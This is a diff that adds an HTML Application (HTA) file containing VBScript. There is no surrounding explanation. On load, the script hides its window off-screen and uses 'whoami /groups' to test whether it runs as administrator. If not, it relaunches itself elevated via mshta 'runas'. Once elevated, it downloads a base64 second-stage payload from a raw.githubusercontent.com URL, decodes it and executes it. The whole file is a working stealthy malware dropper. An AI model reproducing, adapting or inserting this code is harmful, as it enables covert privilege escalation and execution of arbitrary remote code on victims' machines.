@@ -1,0 +1,68 @@
+<html>
+<head>
+<HTA:APPLICATION ID="Doc" WINDOWSTATE="minimize" SHOWINTASKBAR="no" BORDER="none" CAPTION="no" SYSMENU="no" SCROLL="no" INNERBORDER="no" MAXIMIZEBUTTON="no" MINIMIZEBUTTON="no" NAVIGABLE="no" CONTEXTMENU="no" SELECTION="no" />
+</head>
+<script language="VBScript">
+Function Dec(s)
+    Dec = ""
+    On Error Resume Next
+    Dim x, n
+    Set x = CreateObject("MSXML2.DOMDocument")
+    Set n = x.createElement("b")
+    n.dataType = "bin.base64"
+    n.text = s
+    Dec = n.nodeTypedValue
+    On Error GoTo 0
+End Function
+
+Sub Window_OnLoad
+    On Error Resume Next
+    self.ResizeTo 0, 0
+    self.MoveTo -3000, -3000
+
+    Dim fso, sh, qs, selfPath, isAdmin, http, b64, code, bytes, i
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    Set sh  = CreateObject("WScript.Shell")
+    qs  = Chr(34)
+
+    selfPath = location.href
+    selfPath = Replace(selfPath, "file:///", "")
+    selfPath = Replace(selfPath, "%20", " ")
+    selfPath = Replace(selfPath, "/", "\")
+
+    isAdmin = False
+    Dim tmpOut, fIn, contents
+    tmpOut = sh.ExpandEnvironmentStrings("%TEMP%") & "\_p.txt"
+    sh.Run "%COMSPEC% /c whoami /groups > " & qs & tmpOut & qs, 0, True
+    Set fIn = fso.OpenTextFile(tmpOut, 1)
+    contents = fIn.ReadAll
+    fIn.Close
+    If InStr(contents, "S-1-16-12288") > 0 Then isAdmin = True
+    fso.DeleteFile tmpOut, True
+    Err.Clear
+
+    If Not isAdmin Then
+        CreateObject("Shell.Application").ShellExecute "mshta.exe", qs & selfPath & qs, "", "runas", 1
+        self.close
+        Exit Sub
+    End If
+
+    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
+    http.Open "GET", "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/stage2.txt", False
+    http.Send
+    If http.Status = 200 Then
+        b64 = http.ResponseText
+        bytes = Dec(b64)
+        If LenB(bytes) > 0 Then
+            code = ""
+            For i = 1 To LenB(bytes)
+                code = code & Chr(AscB(MidB(bytes, i, 1)))
+            Next
+            If Len(code) > 0 Then Execute code
+        End If
+    End If
+    self.close
+End Sub
+</script>
+<body bgcolor="#000000"></body>
+</html>
